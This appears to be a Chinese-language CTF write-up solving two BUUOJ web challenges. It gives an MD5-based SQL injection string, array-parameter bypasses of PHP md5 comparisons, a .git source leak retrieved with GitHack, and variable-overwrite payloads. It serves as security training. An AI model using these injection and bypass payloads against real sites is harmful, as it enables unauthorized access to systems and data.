# Easy MD5

打开题目就一输入框把我整懵了，输入了没反应，然后目录扫描无果，查看网页源代码没发现敏感文件

然后在响应头发现

> Hint: select * from 'admin' where password=md5($pass,true)

输入`ffifdyop`

这样拼接以后就是`"select * from 'admin' where password='' or'6蒥欓!r,b' "`

or后面的句子第一个字母是非0打头的数字符，比如为 ‘ 1abc ’ 或者 ‘ -1bde ’都会被认为是true

之后进入下一个页面，查看网页源代码得到关键代码，直接数组绕过

```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

```
http://ec1c5bb6-221c-4577-8d10-0bc84cb670d0.node3.buuoj.cn/levels91.php?a[]=1&b[]=2
```

之后post

```
param1[]=1&param2[]=2
```

## [BJDCTF2020]Mark loves cat

首先查看网页源代码在网页最下方发现了dog，尝试以get请求拼接，无果，额只能目录扫描看看有啥可利用的了

发现.git源码泄露，使用GitHack获取关键源码

```
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';
//变量覆盖
foreach($_POST as $x => $y){
    $$x = $y;
}
//变量覆盖
foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){ //如果GET传入的参数当中没有flag则进入循环
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

payload1：

```
flag2=11&yds=flag
```

payload2：和上面是等价的

```
yds=flag
```

在页面最下方获取到flag



# [BJDCTF2020]The mystery of ip



# 仓库地址

https://github.com/BjdsecCA/BJDCTF2020仓库地址，有空复现以下题目